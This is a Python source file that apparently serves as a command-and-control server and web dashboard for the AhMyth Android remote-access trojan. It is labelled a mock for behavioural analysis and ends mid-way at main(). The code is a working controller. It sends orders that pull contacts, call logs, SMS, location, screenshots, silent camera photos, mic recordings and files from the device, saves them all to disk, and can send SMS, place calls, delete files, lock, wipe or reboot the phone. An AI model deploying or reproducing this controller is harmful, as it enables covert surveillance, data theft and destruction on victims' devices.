#!/usr/bin/env python3
"""Mock C2 test client -- behavioral analysis only.

A zero-dependency, local stand-in for the AhMyth control server so you can
exercise the Android client's handlers on hardware YOU own and observe every
response it emits over the wire, with no real C2 involved.

Protocol
--------
The app under test (socket.io-client-java 2.0.1) actually speaks:
  * Engine.IO v4   (handshake GET /socket.io/?EIO=4&transport=polling...)
  * Socket.IO protocol v5  (events '42["name",args...]')
Only the HTTP long-polling transport is implemented (the server does not
advertise websocket upgrades, so the client stays on polling). The connect
ack must carry {"sid": ...} or this client refuses to connect.

Run
---
    python3 tools/mock_c2_test_client.py [--port 42474] [--ping 10] [--out DIR]

Per-run configuration
----------------------
The APK now reads a runtime config file (see tools/c2_config.template.json)
so you can change the server URL / device id per run without rebuilding:

    adb push tools/c2_config.template.json /sdcard/Download/c2_config.json

On the emulator the app reaches this machine at http://10.0.2.2:42474; on a
physical phone over wireless adb, tunnel with:

    adb reverse tcp:42474 tcp:42474

and point the config at http://127.0.0.1:42474.

Downloads
---------
Every response the app emits is saved under --out (default ./c2_out) as
<device>/<timestamp>_<order>.json plus a human-readable .txt export for
contacts / call logs / SMS / app lists. Photos come back as <order>.jpg
files (base64-decoded by the server) and mic / file-download payloads are
written as raw <order>_<name> binaries, so you can grab them from the
dashboard's Downloads panel (or GET /files/<name>).

Type 'help' at the order> prompt for the list of orders.

WARNING
-------
Orders are executed by the app on whatever device it is installed on.
Use only on hardware you own.  lock / wipe / reboot / delete / call /
sms-send really perform those actions on that device.
"""

import argparse
import base64
import json
import os
import re
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from uuid import uuid4

# ---------------------------------------------------------------------------
# console output
# ---------------------------------------------------------------------------

_print_lock = threading.Lock()
_log_buffer = []
_log_lock = threading.Lock()


def log(msg):
    line = "[%s] %s" % (time.strftime("%H:%M:%S"), msg)
    with _log_lock:
        _log_buffer.append(line)
        if len(_log_buffer) > 3000:
            del _log_buffer[:-3000]
    with _print_lock:
        print(line, flush=True)


def log_lines(since=0):
    with _log_lock:
        return list(_log_buffer[since:]), len(_log_buffer)


def summarize(o, depth=0):
    if depth > 3:
        return "..."
    if isinstance(o, dict):
        return {k: summarize(v, depth + 1) for k, v in list(o.items())[:12]}
    if isinstance(o, (list, tuple)):
        head = [summarize(x, depth + 1) for x in list(o)[:5]]
        return head + (["..."] if len(o) > 5 else [])
    if isinstance(o, bytes):
        return "<%d bytes>" % len(o)
    if isinstance(o, str):
        return o if len(o) <= 120 else o[:117] + "..."
    return o


# ---------------------------------------------------------------------------
# response capture (per-run downloads)
# ---------------------------------------------------------------------------

class ResponseSaver(object):
    """Persist every app response to disk: raw JSON + a readable .txt export."""

    def __init__(self, outdir):
        self.outdir = outdir
        self._seq = 0
        self._seq_lock = threading.Lock()
        try:
            os.makedirs(outdir, exist_ok=True)
        except OSError:
            pass

    def devdir(self, dev):
        base = sanitize(dev.info.get("id")) or sanitize(dev.info.get("model")) \
            or dev.eio_sid[:8]
        d = os.path.join(self.outdir, base)
        try:
            os.makedirs(d, exist_ok=True)
        except OSError:
            pass
        return d

    def save(self, dev, name, data):
        try:
            stamp = time.strftime("%Y%m%d-%H%M%S")
            with self._seq_lock:            # keep names unique even when several
                self._seq += 1              # responses of one order arrive in
                seq = self._seq             # the same second (e.g. notifications)
            d = self.devdir(dev)
            base = "%s_%04d_%s" % (stamp, seq, sanitize(name))
            # binary payload (mic recording, downloaded file, …): write the
            # raw bytes to disk and keep a small json stub instead of the blob
            if isinstance(data, dict) and isinstance(data.get("buffer"), (bytes, bytearray)):
                raw = bytes(data["buffer"])
                fname = sanitize(data.get("name") or (name + ".bin")) or (name + ".bin")
                bpath = os.path.join(d, base + "_" + fname)
                with open(bpath, "wb") as f:
                    f.write(raw)
                meta = {k: v for k, v in data.items() if k != "buffer"}
                meta["buffer"] = "<%d bytes saved as %s>" % (len(raw), os.path.basename(bpath))
                with open(os.path.join(d, base + ".json"), "w") as f:
                    f.write(json.dumps(meta, indent=2, default=str))
                log("[*] saved binary %s (%d bytes)" % (bpath, len(raw)))
                return
            # base64 photo (Camera2 emit): decode to a .jpg and stub the json
            if isinstance(data, dict) and data.get("base64") and data.get("image") is True:
                try:
                    raw = base64.b64decode(data["base64"])
                    ipath = os.path.join(d, base + ".jpg")
                    with open(ipath, "wb") as f:
                        f.write(raw)
                    meta = {k: v for k, v in data.items() if k != "base64"}
                    meta["base64"] = "<%d bytes saved as %s>" % (len(raw), os.path.basename(ipath))
                    with open(os.path.join(d, base + ".json"), "w") as f:
                        f.write(json.dumps(meta, indent=2, default=str))
                    log("[*] saved photo %s (%d bytes)" % (ipath, len(raw)))
                    return
                except Exception as e:
                    log("! photo decode failed, keeping json: %s" % e)
            raw = json.dumps(data, indent=2, default=str)
            jpath = os.path.join(d, base + ".json")
            with open(jpath, "w") as f:
                f.write(raw)
            txt = render_text(name, data)
            if txt is not None:
                with open(os.path.join(d, base + ".txt"), "w") as f:
                    f.write(txt)
            log("[*] saved %s (%d bytes)" % (jpath, len(raw)))
        except Exception as e:
            log("! failed to save response: %s" % e)

    def files(self, limit=200):
        out = []
        try:
            entries = os.listdir(self.outdir)
        except OSError:
            return out
        for dname in sorted(entries):
            dpath = os.path.join(self.outdir, dname)
            if not os.path.isdir(dpath):
                continue
            for fname in sorted(os.listdir(dpath), reverse=True):
                fpath = os.path.join(dpath, fname)
                if not os.path.isfile(fpath):
                    continue
                try:
                    st = os.stat(fpath)
                except OSError:
                    continue
                order = fname.split("_", 2)[-1].split(".")[0] if "_" in fname else fname
                out.append({"device": dname, "name": fname, "order": order,
                            "size": st.st_size, "mtime": st.st_mtime,
                            "url": "/files/%s/%s" % (dname, fname)})
                if len(out) >= limit:
                    return out
        return out


def sanitize(s):
    return re.sub(r"[^A-Za-z0-9._-]+", "_", str(s or ""))[:64]


def placeholder_count(o):
    """How many binary attachments a socket.io args tree references."""
    if isinstance(o, dict):
        if o.get("_placeholder") is True:
            return 1
        return sum(placeholder_count(v) for v in o.values())
    if isinstance(o, list):
        return sum(placeholder_count(v) for v in o)
    return 0


def fill_placeholders(o, buf):
    """Replace _placeholder refs with buffered attachments (in num order)."""
    if isinstance(o, dict):
        if o.get("_placeholder") is True and buf:
            return buf.pop(0)
        return {k: fill_placeholders(v, buf) for k, v in o.items()}
    if isinstance(o, list):
        return [fill_placeholders(v, buf) for v in o]
    return o


def render_text(name, data):
    """Human-readable .txt export for list-style responses; None otherwise."""
    if not isinstance(data, dict):
        return None
    stamp = time.strftime("%Y-%m-%d %H:%M:%S")

    if name == "x0000cn" and isinstance(data.get("contactsList"), list):
        lines = ["# Contacts  (captured %s)" % stamp, ""]
        for c in data["contactsList"]:
            lines.append("Name:    %s" % (c.get("name") or ""))
            lines.append("Number:  %s" % (c.get("number") or ""))
            lines.append("-" * 40)
        return "\n".join(lines)

    if name == "x0000cl" and isinstance(data.get("callsList"), list):
        lines = ["# Call log  (captured %s)" % stamp, ""]
        for c in data["callsList"]:
            lines.append("Name:      %s" % (c.get("name") or ""))
            lines.append("Number:    %s" % (c.get("number") or ""))
            lines.append("Duration:  %s" % (c.get("duration") or ""))
            lines.append("-" * 40)
        return "\n".join(lines)

    if name == "x0000sm" and isinstance(data.get("smsList"), list):
        lines = ["# SMS inbox  (captured %s)" % stamp, ""]
        for m in data["smsList"]:
            lines.append("From/To:  %s" % (m.get("address") or m.get("phone") or ""))
            lines.append("Date:     %s" % (m.get("date") or ""))
            lines.append("Body:     %s" % (m.get("msg") or m.get("body") or ""))
            lines.append("-" * 40)
        return "\n".join(lines)

    if name == "x0000apps" and isinstance(data.get("appsList"), list):
        lines = ["# Installed apps  (captured %s)" % stamp, ""]
        for a in data["appsList"]:
            lines.append("%s  (%s)  v%s" % (a.get("appName") or "?",
                                            a.get("packageName") or "?",
                                            a.get("versionName") or "?"))
        return "\n".join(lines)

    return None


# ---------------------------------------------------------------------------
# Engine.IO / Socket.IO plumbing
# ---------------------------------------------------------------------------

class Device(object):
    def __init__(self, info, eio_version):
        self.eio_sid = uuid4().hex
        self.sio_sid = None
        self.info = info
        self.eio = eio_version          # 3 or 4
        self.connected = False
        self.closed = False
        self.packets = []          # outbound Engine.IO packet strings
        self.cond = threading.Condition()
        self.last_ping = time.monotonic()
        self.last_pong = time.monotonic()
        self.bin_buf = []          # incoming binary attachments, in num order
        self.pending_binary = []   # events waiting for their attachments


class C2Server(object):
    def __init__(self, ping_interval=25, ping_timeout=60):
        self.devices = {}          # eio_sid -> Device
        self.lock = threading.RLock()
        self.ping_interval = ping_interval
        self.ping_timeout = ping_timeout
        self.saver = None          # ResponseSaver, set in main()

    # -- device plumbing ------------------------------------------------
    def queue(self, dev, packet):
        with dev.cond:
            dev.packets.append(packet)
            dev.cond.notify_all()

    def close_device(self, dev):
        if dev.closed:
            return
        dev.closed = True
        with self.lock:
            self.devices.pop(dev.eio_sid, None)
        with dev.cond:
            dev.cond.notify_all()
        log("[-] device closed   sid=%s%s" % (
            dev.eio_sid[:8],
            ("  model=%s" % dev.info["model"]) if dev.info["model"] else ""))

    # -- Engine.IO ------------------------------------------------------
    def handshake(self, query):
        q = urllib.parse.parse_qs(query)
        eio = 4 if q.get("EIO", ["3"])[0] == "4" else 3
        dev = Device(parse_device_info(query), eio)
        with self.lock:
            self.devices[dev.eio_sid] = dev
        body = json.dumps({"sid": dev.eio_sid, "upgrades": [],
                           "pingInterval": 25000, "pingTimeout": 60000})
        log("[+] engine.io session  %s  (EIO=%d)  model=%s manf=%s android=%s id=%s" % (
            dev.eio_sid[:8], eio, dev.info["model"] or "?", dev.info["manf"] or "?",
            dev.info["release"] or "?", dev.info["id"] or "?"))
        return "0" + body

    def poll(self, dev):
        with dev.cond:
            deadline = time.monotonic() + 20.0
            while not dev.packets and not dev.closed and time.monotonic() < deadline:
                dev.cond.wait(0.5)
            if not dev.packets:
                return ""
            out = "\x1e".join(dev.packets)
            dev.packets = []
        return out

    def post(self, dev, body):
        chunks = [c.strip() for c in body.split("\x1e") if c.strip()]
        # pass 1: collect binary attachments first. Attachments can arrive in
        # the same POST body as their message OR in a later POST, so buffer
        # them and flush any events that were waiting for them.
        got_binary = False
        for pkt in chunks:
            if pkt[0] == "b":
                got_binary = True
                try:
                    dev.bin_buf.append(base64.b64decode(pkt[1:]))
                except Exception:
                    pass
        if got_binary:
            self._flush_pending_binary(dev)
        # pass 2: process text packets
        for pkt in chunks:
            t = pkt[0]
            if t == "b":
                continue
            if t == "2":                       # engine.io ping -> pong (EIO4 clients ping; EIO3 clients shouldn't)
                self.queue(dev, "3")
            elif t == "3":                     # engine.io pong (EIO3 clients reply to our ping)
                dev.last_pong = time.monotonic()
            elif t == "1":                     # close
                self.close_device(dev)
            elif t == "4":                     # socket.io message
                self._socketio_packet(dev, pkt[1:])
            elif t in ("5", "6"):              # upgrade / noop: ignore
                pass

    def _flush_pending_binary(self, dev):
        if not dev.pending_binary:
            return
        remaining = []
        for name, args, needed in dev.pending_binary:
            if needed <= len(dev.bin_buf):
                args = fill_placeholders(args, dev.bin_buf)
                self._on_event(dev, name, args)
            else:
                remaining.append((name, args, needed))
        dev.pending_binary = remaining

    # -- Socket.IO (protocol v4) ----------------------------------------
    def _socketio_packet(self, dev, payload):
        if not payload:
            return
        st = payload[0]
        if st == "0":                          # connect
            dev.sio_sid = uuid4().hex
            dev.connected = True
            # socket.io-client-java 2.0.1 REQUIRES the connect ack to carry
            # {"sid": ...} data (it rejects a plain v5-style "40" with
            # connect_error "v2.x with a v3.x client").
            self.queue(dev, '40{"sid":"%s"}' % dev.sio_sid)
            log("[+] DEVICE CONNECTED  eio=%s sio=%s  model=%s manf=%s "
                "android=%s device_id=%s  (%d connected)" % (
                    dev.eio_sid[:8], dev.sio_sid[:8],
                    dev.info["model"] or "?", dev.info["manf"] or "?",
                    dev.info["release"] or "?", dev.info["id"] or "?",
                    sum(1 for d in self.devices.values() if d.connected)))
        elif st == "1":                        # disconnect
            log("[!] socket.io disconnect from %s" % dev.eio_sid[:8])
            self.close_device(dev)
        elif st == "2":                        # event
            try:
                data = json.loads(payload[1:])
                name, args = data[0], list(data[1:])
            except Exception:
                name, args = "<unparsed>", [payload[1:]]
            self._on_event(dev, name, args)
        elif st == "5":                        # binary event: resolve attachments
            self._binary_event(dev, payload[1:])
        elif st in ("3", "4", "6"):           # ack / error / binary ack: ignore
            pass

    def _binary_event(self, dev, payload):
        # socket.io v5 binary event: 5<attachments>-<json>
        if "-" in payload:
            prefix, _, rest = payload.partition("-")
            if prefix.isdigit():
                payload = rest
        try:
            data = json.loads(payload)
            name, args = data[0], list(data[1:])
        except Exception:
            log("[<] <binary event>  <- %s (unparseable)" % dev.eio_sid[:8])
            return
        needed = placeholder_count(args)
        if needed <= len(dev.bin_buf):
            args = fill_placeholders(args, dev.bin_buf)
            self._on_event(dev, name, args)
        else:
            dev.pending_binary.append((name, args, needed))

    def emit(self, dev, name, args=None):
        self.queue(dev, "42" + json.dumps([name] + (args or [])))

    def send_order(self, payload, sid_filter=None):
        """Emit an order to connected devices (all, or those matching sid_filter)."""
        targets = [d for d in self.devices.values()
                   if d.connected and not d.closed
                   and (sid_filter is None or d.eio_sid.startswith(sid_filter))]
        if not targets:
            return 0
        for dev in targets:
            log("[->] order -> %s : %s" % (dev.eio_sid[:8], json.dumps(payload)))
            self.emit(dev, "order", [payload])
        return len(targets)

    def _on_event(self, dev, name, args):
        if name == "pong":
            log("[<] pong  <- %s   (app-level heartbeat reply)" % dev.eio_sid[:8])
            return
        data = args[0] if len(args) == 1 else args
        log("[<] %s  <- %s" % (name, dev.eio_sid[:8]))
        with _print_lock:
            print("    %s" % json.dumps(summarize(data), indent=4, default=str),
                  flush=True)
        if self.saver is not None:
            self.saver.save(dev, name, data)

    # -- heartbeats ------------------------------------------------------
    def monitor(self):
        while True:
            time.sleep(10)
            now = time.monotonic()
            for dev in list(self.devices.values()):
                if dev.closed:
                    continue
                if dev.eio != 3:                # EIO4: client pings, we pong
                    continue
                if now - dev.last_ping >= self.ping_interval:
                    dev.last_ping = now
                    self.queue(dev, "2")
                if now - dev.last_pong > self.ping_timeout:
                    log("[!] engine.io ping timeout, closing %s" % dev.eio_sid[:8])
                    self.close_device(dev)

    def app_heartbeat(self, interval):
        while True:
            time.sleep(interval)
            targets = [d for d in self.devices.values() if d.connected and not d.closed]
            if targets:
                log("[->] ping (app-level heartbeat) -> %d device(s)" % len(targets))
                for dev in targets:
                    self.emit(dev, "ping")


def parse_device_info(query):
    p = urllib.parse.parse_qs(query)
    return {k: (p.get(k, [""])[0]) for k in ("model", "manf", "release", "id")}


# ---------------------------------------------------------------------------
# Web dashboard
# ---------------------------------------------------------------------------

CONFIG_TEMPLATE = json.dumps({
    "url": "http://127.0.0.1:42474",
    "device_id": "my-test-device",
}, indent=2) + "\n"

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Mock C2 &middot; analysis console</title>
<style>
  :root { --bg:#0d1117; --panel:#161b22; --border:#30363d; --fg:#e6edf3; --dim:#8b949e;
          --accent:#58a6ff; --ok:#3fb950; --warn:#d29922; --danger:#f85149; }
  * { box-sizing:border-box; }
  body { margin:0; background:var(--bg); color:var(--fg); font:14px/1.45 ui-monospace,SFMono-Regular,Menlo,monospace; }
  header { padding:14px 20px; border-bottom:1px solid var(--border); display:flex; align-items:baseline; gap:14px; }
  header h1 { font-size:16px; margin:0; }
  header .count { color:var(--dim); }
  main { padding:20px; display:grid; grid-template-columns: 340px 1fr; gap:20px; }
  @media (max-width:900px){ main { grid-template-columns:1fr; } }
  .card { background:var(--panel); border:1px solid var(--border); border-radius:10px; padding:14px; }
  .card h2 { margin:0 0 10px; font-size:12px; text-transform:uppercase; letter-spacing:.08em; color:var(--dim); }
  .dev { padding:10px; border:1px solid var(--border); border-radius:8px; margin-bottom:8px; cursor:pointer; transition:border-color .15s; }
  .dev.sel { border-color:var(--accent); box-shadow:0 0 0 1px var(--accent); }
  .dev .top { display:flex; justify-content:space-between; }
  .dev .model { font-weight:600; }
  .dot { width:8px; height:8px; border-radius:50%; background:var(--ok); display:inline-block; margin-right:6px; }
  .dev .meta { color:var(--dim); font-size:12px; margin-top:4px; }
  .btns { display:grid; grid-template-columns:repeat(auto-fill,minmax(92px,1fr)); gap:8px; margin-top:10px; }
  button { background:#21262d; color:var(--fg); border:1px solid var(--border); border-radius:7px; padding:8px 10px;
           font:inherit; cursor:pointer; transition:background .15s,border-color .15s; }
  button:hover { background:#30363d; border-color:var(--accent); }
  button.warn { border-color:var(--warn); } button.warn:hover { background:#3a2f12; }
  button.danger { border-color:var(--danger); } button.danger:hover { background:#3d1416; }
  .row { display:flex; gap:8px; margin-top:10px; }
  input[type=text] { flex:1; background:#0d1117; color:var(--fg); border:1px solid var(--border); border-radius:7px; padding:8px 10px; font:inherit; }
  #log { height:460px; overflow-y:auto; background:#0d1117; border:1px solid var(--border); border-radius:8px; padding:10px; font-size:12px; }
  #log .in { color:var(--accent); } #log .out { color:var(--ok); } #log .err { color:var(--danger); } #log .dim { color:var(--dim); }
  #files a { display:block; padding:5px 8px; margin-bottom:4px; background:#0d1117; border:1px solid var(--border); border-radius:6px; color:var(--fg); text-decoration:none; font-size:12px; }
  #files a:hover { border-color:var(--accent); color:var(--accent); }
</style>
</head>
<body>
<header><h1>Mock C2 &middot; analysis console</h1><span class="count" id="count">0 connected</span></header>
<main>
  <div>
    <div class="card"><h2>Devices &mdash; click to target</h2><div id="devs"><p class="dim">waiting&hellip;</p></div></div>
    <div class="card" style="margin-top:14px"><h2>Raw order</h2>
      <div class="row"><input type="text" id="raw" placeholder="e.g. lm &middot; fm-ls /storage/emulated/0 &middot; mc 5 &middot; raw {...}">
      <button id="sendraw">Send</button></div>
      <div class="dim" style="font-size:11px;margin-top:6px">photo (no UI): <code>cam-on 0</code> (back) / <code>cam-on 1</code> (front) &middot; apps control: <code>run-app com.android.settings</code></div>
    </div>
    <div class="card" style="margin-top:14px"><h2>Downloads &mdash; captured responses</h2>
      <div id="files" style="max-height:180px;overflow-y:auto"><p class="dim">waiting&hellip;</p></div>
      <div class="dim" style="font-size:11px;margin-top:6px">every response is saved as <code>.json</code> + readable <code>.txt</code> (contacts / calls / SMS / apps)</div>
    </div>
  </div>
  <div class="card"><h2>Live log</h2><div id="log"></div></div>
</main>
<script>
let target=""; let since=0;
const $=id=>document.getElementById(id);
const QUICK=[["apps","apps"],["contacts","cn"],["calls","cl"],["sms","sms"],["cameras","ca"],["location","lm"],["screen","sc"],["photo-back","cam-on 0"],["photo-front","cam-on 1"]];
function pollDevices(){fetch("/api/devices").then(r=>r.json()).then(d=>{
  $("count").textContent=d.length+" connected";
  $("devs").innerHTML=d.length?"":"<p class='dim'>no devices</p>";
  d.forEach(x=>{const el=document.createElement("div");el.className="dev"+(x.sid===target?" sel":"");
    el.innerHTML=`<div class=top><span class=model>${esc(x.model||"?")}</span><span><span class=dot></span>${esc(x.manf||"?")} &middot; Android ${esc(x.release||"?")}</span></div>`+
      `<div class=meta>${esc(x.sid.slice(0,8))} &middot; device_id ${esc(x.id||"?")}</div>`+
      `<div class=btns>${QUICK.map(q=>`<button data-o="${q[1]}">${q[0]}</button>`).join("")}</div>`;
    el.onclick=e=>{target=x.sid;renderDevs();};
    el.querySelectorAll("button").forEach(b=>b.onclick=e=>{e.stopPropagation();order(b.dataset.o);});
    $("devs").appendChild(el);
  });
});}
function renderDevs(){ /* selection highlight is applied during poll */ }
function esc(s){return s.replace(/[&<>"']/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));}
function order(cmd){fetch("/api/order",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order:cmd,target})});}
$("sendraw").onclick=()=>{const v=$("raw").value.trim();if(v){order(v);$("raw").value="";}};
$("raw").addEventListener("keydown",e=>{if(e.key==="Enter")$("sendraw").click();});
function pollLog(){fetch("/api/log?since="+since).then(r=>r.json()).then(d=>{
  const L=$("log");const atBottom=L.scrollHeight-L.scrollTop-L.clientHeight<40;
  d.lines.forEach(l=>{const div=document.createElement("div");
    const cls=/pong|DEVICE CONNECTED/.test(l)?"in":/\[<\]|POST <-/.test(l)?"in":/error|reject|FATAL|! /.test(l)?"err":/order ->|ping/.test(l)?"out":"dim";
    div.className=cls;div.textContent=l;L.appendChild(div);});
  while(L.childNodes.length>600)L.removeChild(L.firstChild);
  since=d.next;if(atBottom)L.scrollTop=L.scrollHeight;
});}
function pollFiles(){fetch("/api/files").then(r=>r.json()).then(list=>{
  $("files").innerHTML=list.length?"":"<p class='dim'>no captures yet</p>";
  list.slice(0,40).forEach(f=>{const a=document.createElement("a");a.href=f.url; a.download=f.name;
    a.textContent=`${f.device.slice(0,14)} &middot; ${f.order} &middot; ${(f.size/1024).toFixed(1)} KB`;
    a.className="frow";a.title="GET "+f.url;$("files").appendChild(a);});
});}
setInterval(pollDevices,1500);setInterval(pollLog,1200);setInterval(pollFiles,2500);
pollDevices();pollLog();pollFiles();
</script>
</body>
</html>
"""

# ---------------------------------------------------------------------------
# HTTP transport (Engine.IO v3 long-polling)
# ---------------------------------------------------------------------------

class Handler(BaseHTTPRequestHandler):
    c2 = None
    protocol_version = "HTTP/1.1"

    def _parse(self):
        parts = urllib.parse.urlsplit(self.path)
        self.path_only = parts.path
        self.query = parts.query or ""

    def _file(self, rel):
        """Serve a captured response file as a download (GET /files/<dev>/<name>)."""
        if self.c2.saver is None:
            return self._send(404, "no capture dir")
        rel = rel.replace("\\", "/")
        if rel.startswith("/") or ".." in rel.split("/"):
            return self._send(400, "invalid path")
        path = os.path.join(self.c2.saver.outdir, rel)
        try:
            size = os.path.getsize(path)
            if size > 64 * 1024 * 1024:      # don't buffer giant captures
                return self._send(413, "file too large")
            with open(path, "rb") as f:
                payload = f.read()
        except (OSError, IOError):
            return self._send(404, "not found")
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=UTF-8")
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Content-Disposition",
                         "attachment; filename=\"%s\"" % os.path.basename(rel))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        try:
            self.wfile.write(payload)
        except Exception:
            pass

    def _send(self, code, body, ctype="text/plain; charset=UTF-8"):
        payload = body.encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(payload)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        try:
            self.wfile.write(payload)
        except Exception:
            pass

    def _api(self):
        try:
            if self.command == "GET" and self.path_only == "/api/devices":
                devs = [{"sid": d.eio_sid, "model": d.info["model"],
                         "manf": d.info["manf"], "release": d.info["release"],
                         "id": d.info["id"]}
                        for d in self.c2.devices.values() if d.connected]
                return self._send(200, json.dumps(devs), "application/json")
            if self.command == "GET" and self.path_only == "/api/log":
                q = urllib.parse.parse_qs(self.query)
                since = int((q.get("since") or ["0"])[0] or 0)
                lines, n = log_lines(since)
                return self._send(200, json.dumps({"next": n, "lines": lines}),
                                  "application/json")
            if self.command == "POST" and self.path_only == "/api/order":
                length = int(self.headers.get("Content-Length") or 0)
                req = json.loads(self.rfile.read(length).decode("utf-8", "replace") or "{}")
                cmd = req.get("order", "")
                target = req.get("target") or None
                payload, warn = parse_command(cmd)
                if payload is None:
                    return self._send(400, json.dumps({"error": "unknown order"}),
                                      "application/json")
                if warn:
                    log("! %s" % warn)
                n = self.c2.send_order(payload, target)
                return self._send(200, json.dumps({"sent": n}), "application/json")
            if self.command == "GET" and self.path_only == "/api/files":
                if self.c2.saver is None:
                    return self._send(200, json.dumps([]), "application/json")
                return self._send(200, json.dumps(self.c2.saver.files()),
                                  "application/json")
            if self.command == "GET" and self.path_only == "/api/config-template":
                return self._send(200, CONFIG_TEMPLATE, "application/json")
        except Exception as e:
            return self._send(400, json.dumps({"error": str(e)}), "application/json")
        return self._send(400, "not found")

    def _route(self):
        if self.path_only in ("/", "/index.html"):
            return self._send(200, DASHBOARD_HTML, "text/html; charset=UTF-8")
        if self.path_only.startswith("/api/"):
            return self._api()
        if self.path_only.startswith("/files/"):
            return self._file(self.path_only[len("/files/"):])
        if self.path_only != "/socket.io/":
            log("[?] rejected: %s path=%s query=%s" % (self.command, self.path_only, self.query[:200]))
            return self._send(400, "invalid path")
        q = urllib.parse.parse_qs(self.query)
        if q.get("transport", ["polling"])[0] != "polling":
            log("[?] rejected transport: %s" % self.query[:120])
            return self._send(400, "unsupported transport")
        if q.get("EIO", ["3"])[0] not in ("3", "4"):
            log("[?] rejected EIO: %s" % self.query[:120])
            return self._send(400, "unsupported Engine.IO version")
        sid = (q.get("sid") or [None])[0]
        if sid is None:
            if self.command == "GET":
                return self._send(200, self.c2.handshake(self.query))
            return self._send(400, "bad request")
        dev = self.c2.devices.get(sid)
        if dev is None or dev.closed:
            log("[?] unknown sid: %s" % sid[:12])
            return self._send(400, "unknown sid")
        if self.command == "GET":
            out = self.c2.poll(dev)
            log("    GET poll -> %s bytes (sid %s)" % (len(out), sid[:8]))
            return self._send(200, out)
        try:
            length = int(self.headers.get("Content-Length") or 0)
        except (TypeError, ValueError):
            length = 0
        body = self.rfile.read(length).decode("utf-8", "replace")
        if q.get("b64", ["0"])[0] == "1":
            try:
                body = base64.b64decode(body).decode("utf-8", "replace")
            except Exception:
                pass
        log("    POST <- %r (sid %s)" % (body[:160], sid[:8]))
        self.c2.post(dev, body)
        return self._send(200, "ok")

    def do_GET(self):
        self._parse()
        self._route()

    def do_POST(self):
        self._parse()
        self._route()

    def log_message(self, *a):
        pass


# ---------------------------------------------------------------------------
# order prompt
# ---------------------------------------------------------------------------

SIMPLE = {
    "lm": {"order": "x0000lm"},
    "cn": {"order": "x0000cn"},
    "cl": {"order": "x0000cl"},
    "apps": {"order": "x0000apps"},
    "sms": {"order": "x0000sm", "extra": "ls"},
    "ca": {"order": "x0000ca", "extra": "camList"},
    "sc": {"order": "x0000sc"},
}

HELP = """\
Orders (sent to every connected device; responses are printed as they arrive
and saved under --out as .json + readable .txt):
  lm            location (lat/lng/provider/accuracy)   cn       contacts
  cl            call logs          apps          installed apps
  sms           SMS inbox          ca            camera list
  sc            screen capture*    cam-on [0|1]  take photo, no UI (0=back 1=front)
  mc <sec>      record mic <sec>s
  fm-ls <path>  list directory     fm-dl <path>  download file
  sms-send <to> <text>             run-app <pkg>   e.g. com.android.settings
  open-url <url>                   delete <path>    delete on device
  call <number>                    lock / wipe / reboot  (device actions!)
  raw <json>    send arbitrary order payload
  who / help / quit
* needs the screen-capture grant given during first app launch."""


def parse_command(line):
    tokens = line.split()
    cmd = tokens[0].lower() if tokens else ""
    rest = tokens[1:]
    payload, warn = None, None

    if cmd in SIMPLE:
        payload = SIMPLE[cmd]
    elif cmd == "cam-on":
        payload = {"order": "x0000ca", "extra": rest[0] if rest else "1"}
    elif cmd == "mc" and len(rest) == 1 and rest[0].isdigit():
        payload = {"order": "x0000mc", "sec": int(rest[0])}
    elif cmd == "fm-ls" and len(rest) == 1:
        payload = {"order": "x0000fm", "extra": "ls", "path": rest[0]}
    elif cmd == "fm-dl" and len(rest) == 1:
        payload = {"order": "x0000fm", "extra": "dl", "path": rest[0]}
    elif cmd == "sms-send" and len(rest) >= 2:
        payload = {"order": "x0000sm", "extra": "sendSMS",
                   "to": rest[0], "sms": " ".join(rest[1:])}
    elif cmd == "run-app" and len(rest) == 1:
        payload = {"order": "x0000runApp", "extra": rest[0]}
    elif cmd == "open-url" and len(rest) == 1:
        payload = {"order": "x0000openUrl", "url": rest[0]}
    elif cmd == "delete" and len(rest) == 1:
        payload = {"order": "x0000deleteFF", "fileFolderPath": rest[0]}
        warn = "delete removes the file/folder ON the device."
    elif cmd == "call" and len(rest) == 1:
        payload = {"order": "x0000dm", "number": rest[0]}
        warn = "call dials the number ON the device."
    elif cmd == "lock":
        payload = {"order": "x0000lockDevice"}
        warn = "lock really locks the device screen."
    elif cmd == "wipe":
        payload = {"order": "x0000wipeDevice"}
        warn = "wipe FACTORY-RESETS the device. Only run on throwaway hardware."
    elif cmd == "reboot":
        payload = {"order": "x0000rebootDevice"}
        warn = "reboot really reboots the device."
    elif cmd == "raw" and rest:
        try:
            payload = json.loads(" ".join(rest))
        except json.JSONDecodeError as e:
            log("bad JSON: %s" % e)
    else:
        log("unknown command: %s   (try 'help')" % line)
    return payload, warn


def console_loop(c2):
    while True:
        try:
            line = input("order> ").strip()
        except EOFError:
            log("stdin closed - running headless (Ctrl+C or kill to stop)")
            threading.Event().wait()  # block until interrupted
        except KeyboardInterrupt:
            return
        if not line:
            continue
        low = line.lower()
        if low in ("quit", "exit"):
            log("bye")
            return
        if low == "help":
            with _print_lock:
                print(HELP, flush=True)
            continue
        if low == "who":
            conn = [d for d in c2.devices.values() if d.connected]
            if not conn:
                log("no devices connected")
            for d in conn:
                log("  %s  model=%s manf=%s android=%s id=%s" % (
                    d.eio_sid[:8], d.info["model"], d.info["manf"],
                    d.info["release"], d.info["id"]))
            continue
        payload, warn = parse_command(line)
        if payload is None:
            continue
        if warn:
            log("! %s" % warn)
        targets = [d for d in c2.devices.values() if d.connected and not d.closed]
        if not targets:
            log("(no device connected - nothing to send to)")
            continue
        for dev in targets:
            log("[->] order -> %s : %s" % (dev.eio_sid[:8], json.dumps(payload)))
            c2.emit(dev, "order", [payload])


def local_ips():
    try:
        import socket
        return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                if not ip.startswith("127.")]
    except Exception:
        return []


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main():
